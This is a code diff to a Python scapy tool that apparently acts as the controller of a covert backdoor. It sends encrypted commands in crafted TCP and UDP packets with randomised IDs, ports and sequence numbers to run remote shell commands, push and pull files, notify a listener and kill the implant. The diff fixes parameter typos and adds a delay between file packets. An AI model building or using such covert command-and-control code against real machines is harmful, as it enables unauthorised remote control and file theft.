@@ -18,6 +18,7 @@ from scapy.all import *
 from encrypt import *
 import os
 import random
+import time
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -317,10 +318,11 @@ def sendFile(address, port, sFile):
 	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="")/\
-			            Raw(LOAD=encrypt(sFile))
-		send(commandPacket, verose=0)
+			            Raw(load=encrypt(sFile))
+		send(commandPacket, verbose=0)
 		with open(sFile, "r") as tFile:
 			for line in tFile:
+				time.sleep(0.1)
 				commandPacket[IP].id = commandPacket[IP].id + 1
 				commandPacket[TCP].seq = commandPacket[TCP].seq + 1
 				commandPacket[Raw].load = encrypt(line)
@@ -332,8 +334,8 @@ def sendFile(address, port, sFile):
 	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 1, dport=port)/\
-			            Raw(LOAD=encrypt(sFile))
-		send(commandPacket, verose=0)
+			            Raw(load=encrypt(sFile))
+		send(commandPacket, verbose=0)
 		with open(sFile, "r") as tFile:
 			for line in tFile:
 				commandPacket[IP].id = commandPacket[IP].id + 1
@@ -374,7 +376,7 @@ def getFile(address, port, gFile):
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 2, dport=port)/\
 			            Raw(load=encrypt(gFile))
-	send(commandPacket, verose=0)
+	send(commandPacket, verbose=0)
 
 	with open(gFile, "w") as tFile:
 		while True:
@@ -431,7 +433,7 @@ def terminal(address, port, command):
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 4, dport=port)/\
 			            Raw(load=encrypt(command))
-		send(commandPacket, verose=0)
+		send(commandPacket, verbose=0)
 	
 		while True:
 			dPacket = sniff(filter="udp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
@@ -476,7 +478,7 @@ def notify(address, port, notice, listener):
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 8, dport=port)/\
 			            Raw(load=encrypt(notice + "\n" + listener))
-	send(commandPacket, verose=0)
+	send(commandPacket, verbose=0)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -506,7 +508,7 @@ def kill(address, port):
 	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 16, dport=port)
-	send(commandPacket, verose=0)
+	send(commandPacket, verbose=0)
 
 main()
 
